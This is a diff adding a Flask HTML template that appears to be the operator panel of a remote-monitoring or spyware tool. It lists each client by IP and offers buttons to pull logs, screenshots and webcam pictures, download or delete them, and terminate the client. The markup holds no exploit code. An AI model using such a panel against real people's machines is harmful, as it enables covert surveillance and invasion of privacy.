@@ -1,0 +1,219 @@
+{%extends "base_home.html"%}
+{%block title%}{{ip}}{%endblock%}
+
+
+{%block head%}
+<script type="text/javascript" src="{{ url_for('static',filename='scripts/clientpage.js') }}"></script>
+{%endblock%}
+
+{%block content%}
+
+{%if online%}
+<div class="card border-success mb-3" style="max-width: 20rem; margin: auto; margin-top: 10px;text-align: center">
+    {% else %}
+    <div class="card border-danger mb-3" style="max-width: 20rem; margin: auto; margin-top: 10px;text-align: center">
+        {%endif%}
+        <div class="card-body">
+            <div style="display: flex;justify-content: space-between;">
+
+                <div style="width:30px "></div>
+
+                <div></div>
+
+                <div id="nick">
+                    <h3 class="card-title" style="text-align: center">
+                        {{nick}}
+                    </h3>
+                </div>
+
+                <div class="form-group">
+                    <form id=nick_form method="post">
+                        <input type="text" class="form-control" placeholder="{{nick}}" name="newNick" id="nick_input"
+                               onblur="close_change_nick()"
+                               style="display: none;height: 31px; text-align: center">
+                    </form>
+                </div>
+
+                <button id="change_nick_button" type="button" class="btn btn-primary"
+                        style="width: 30px; height: 31px; padding: 0" onclick="open_change_nick()">
+                    <img src={{url_for("static", filename="edit.png" )}} class="search_image"/>
+                </button>
+            </div>
+            {%if nick%}
+            <p class="card-title" style="font-size: 1.171875rem;">{{ip}}</p>
+            {%else%}
+            <h4 class="card-title">{{ip}}</h4>
+            {%endif%}
+
+            {%if online%}
+            <h5 class="text-success">Online</h5>
+            {%else%}
+            <h5 class="text-danger">Offline</h5>
+            {%endif%}
+        </div>
+    </div>
+
+
+    {%if error%}
+    <div class="alert alert-dismissible alert-danger" id="alertDanger" style="max-width: 30rem; margin: auto">
+        <button type="button" onclick="close_alert('alertDanger')" class="close" id="closeError" data-dismiss="alert">
+            &times;
+        </button>
+        <strong>There has been a problem retrieving the data.<br> Please try again later.</strong>
+    </div>
+    {%endif%}
+
+    {%if success%}
+    <div class="alert alert-dismissible alert-success" id="alertSuccess" style="max-width: 30rem; margin: auto">
+        <button type="button" onclick="close_alert('alertSuccess')" class="close" id="closeSuccess"
+                data-dismiss="alert">
+            &times;
+        </button>
+        {% if online%}
+        <strong>The data has been retrieved successfully.<br></strong>
+        {%else%}
+        <strong>The data has been queued successfully.<br></strong>
+        {%endif%}
+    </div>
+    {%endif%}
+
+
+    <div style="width: 70%;margin: auto; height: 80%">
+        <ul class="nav nav-tabs">
+            <li class="nav-item">
+                <a class="nav-link active" onclick="log_visible()" data-toggle="tab" id="logs" href="#log">Logs</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" data-toggle="tab" onclick="image_visible()" id="images" href="#images">Images</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" data-toggle="tab" onclick="webcam_visible()" id="webcam" href="#webcam">Webcam</a>
+            </li>
+
+        </ul>
+        <div id="images_content"
+             style="overflow-y: scroll;height: 700px;background-color: #1c1e22 !important; display: none">
+
+            {%for img,date in image_list%}
+            <div class="card mb-3"
+                 style="border-radius: 0 0 calc(.25rem - 1px) calc(.25rem - 1px);display: inline-block; margin: 10px; width: 202px; height: 161px"
+                 id="{{img}}"
+                 onclick="selectImage('{{img}}')"
+                 ondblclick="show_image('{{img}}','{{ip}}','{{id}}','image')">
+                <img style="display: flex; margin-left: auto; margin-right: auto; object-fit: scale-down; width: 200px; "
+                     src={{url_for('download_file', client=ip+","+id ,filename=img,type="image" ) }}>
+                <div class="card-footer text-muted" style="border-top: 0">
+                    {{date}}
+                </div>
+            </div>
+
+
+            {%endfor%}
+        </div>
+
+        <div id="logs_content" class="card-body text-white bg-secondary mb-3"
+             style="overflow-y: scroll; height: 700px; FONT-WEIGHT: 100; background-color: #1c1e22 !important; margin-bottom: 0!important;">
+            {% for line in logs%}
+            {{line}} <br>
+            {%endfor%}
+
+        </div>
+
+        <div id="webcam_content"
+             style="overflow-y: scroll;height: 700px;background-color: #1c1e22 !important; display: none">
+
+            {%for img,date in webcam_list%}
+            <div class="card mb-3"
+                 style="border-radius: 0 0 calc(.25rem - 1px) calc(.25rem - 1px);display: inline-block; margin: 10px; width: 202px; height: 196px"
+                 id="{{img}}"
+                 onclick="selectWebcam('{{img}}')"
+                 ondblclick="show_image('{{img}}','{{ip}}','{{id}}','webcam')">
+                <img style="display: flex; margin-left: auto; margin-right: auto; object-fit: scale-down; width: 200px;"
+                     src={{url_for('download_file', client=ip+","+id ,filename=img, type="webcam" ) }}>
+                <div class="card-footer text-muted" style="border-top: 0">
+                    {{date}}
+                </div>
+            </div>
+
+
+            {%endfor%}
+        </div>
+
+        <div class="card text-white bg-primary mb-3" id="button_container">
+            <div class="card-body" style="display: inline; padding-top: 1px; padding-bottom: 1px;">
+
+                <div id="log_buttons" style="display: inline-block">
+
+                    <a href="/uploads/{{ip}},{{id}}/logs.txt/text" download style="display: inline-block">
+                        <button type="button" class="btn btn-primary">Download</button>
+                    </a>
+
+                    <button type="button" onclick="delete_logs('{{ip}}','{{id}}')" id="delete_text_button"
+                            class="btn btn-primary">Delete
+                    </button>
+
+
+                    <button type="button" onclick="fetch_data('{{ip}}','{{id}}','log')" id="fetch_logs"
+                            class="btn btn-secondary"> Get Logs
+                    </button>
+
+                </div>
+
+                <div id="image_buttons" style="display: none">
+
+
+                    <button class="btn btn-primary" style="margin-right: 10px;: " id="imageSelectAll"
+                            onclick="imgSelectAll()">
+                        Select
+                        all
+                    </button>
+
+
+                    <button type="button" onclick="imageDownload('{{ip}}','{{id}}')" id="image_download"
+                            class="btn btn-primary  disabled">Download
+                    </button>
+
+
+                    <button type="button" onclick="imageDelete('{{ip}}','{{id}}')" id="delete_image_button"
+                            class="btn btn-primary disabled">Delete
+                    </button>
+
+                    <button type="button" onclick="fetch_data('{{ip}}','{{id}}','img')" id="fetch_image"
+                            class="btn btn-secondary"> Get Screenshot
+                    </button>
+
+
+                </div>
+
+                <div id="webcam_buttons" style="display: none">
+
+                    <button class="btn btn-primary" style="margin-right: 10px;: " id="webcamSelectAll"
+                            onclick="webcamSelectAll()">
+                        Select
+                        all
+                    </button>
+
+
+                    <button type="button" onclick="webcamDownload('{{ip}}','{{id}}')" id="webcam_download"
+                            class="btn btn-primary  disabled">Download
+                    </button>
+
+
+                    <button type="button" onclick="webcamDelete('{{ip}}','{{id}}')" id="delete_webcam_button"
+                            class="btn btn-primary disabled">Delete
+                    </button>
+
+
+                    <button type="button" onclick="fetch_data('{{ip}}','{{id}}','web')" id="fetch_webcam"
+                            class="btn btn-secondary"> Get Picture
+                    </button>
+
+                </div>
+                <button type="button" onclick="fetch_data('{{ip}}','{{id}}','end')" style="float: right" id="terminate"
+                        class="btn btn-danger"> Terminate Client
+                </button>
+            </div>
+        </div>
+    </div>
+
+    {%endblock%}
